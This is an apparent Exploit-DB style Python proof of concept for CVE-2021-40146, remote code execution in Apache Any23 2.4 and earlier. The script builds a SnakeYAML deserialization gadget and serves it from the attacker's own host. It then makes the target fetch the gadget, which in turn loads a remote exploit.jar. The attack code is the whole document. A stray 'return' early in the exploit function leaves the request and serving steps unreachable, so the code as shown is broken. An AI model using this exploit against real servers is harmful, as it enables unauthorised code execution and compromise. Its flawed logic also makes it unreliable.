# Exploit Title: Any23 2.4 - Remote Code Execution
# Date: 2022-10-06
# Exploit Author: 0xsee4
# Vendor Homepage: https://any23.apache.org/index.html
# Version: <= 2.4
# CVE : CVE-2021-40146

import sys, os, http.server, socketserver, requests, traceback

usage = """Usage: python cve_2021_40146.py <TARGET URL> <YOUR PUBLIC IP>
Example: python cve_2021_40146.py https://vulnerablehost.com 1.2.3.4"""

snake_yaml_gadget = """!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["%s"]
  ]]
]"""

def exploit(target):
    PORT = 9999
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("[+]    Serving at port: %i" % PORT)
        print("[!]    Beginning exploitation of the target: %s" % target)
        return

        reply = requests.get(target)
        print("[!]    Got HTTP Response Code: %i" % reply.status_code)
        httpd.handle_request()
        print("[+]    Target fetched our stage: attack.yaml")
        httpd.handle_request()
        print("[+]    Target fetched our payload: exploit.jar")
        httpd.server_close()

def create_yaml(content):
    with open('attack.yaml', 'w') as outfile:
        outfile.write(content)
        outfile.close()
    print("[+]    Attack file created: attack.yaml")

def delete_yaml():
    os.remove('attack.yaml')
    print("[-]    Attack file removed: attack.yaml")

def main():
    try:
        target = str(sys.argv[1])
        ourIP = str(sys.argv[2])
    except:
        print(usage)
        exit()

    print("[+]    Target acquired: %s" % target)    
    ourURL = "http://" + ourIP + ":9999/exploit.jar"
    target += "/best/http://" + ourIP + ":9999/attack.yaml"
    stage = snake_yaml_gadget % ourURL

    create_yaml(stage)
    try:
        exploit(target)
    except:
        traceback.print_exc()
        print("[!]    An error ocurred, removing exploit file")
    delete_yaml()

if __name__ == '__main__':
    main()
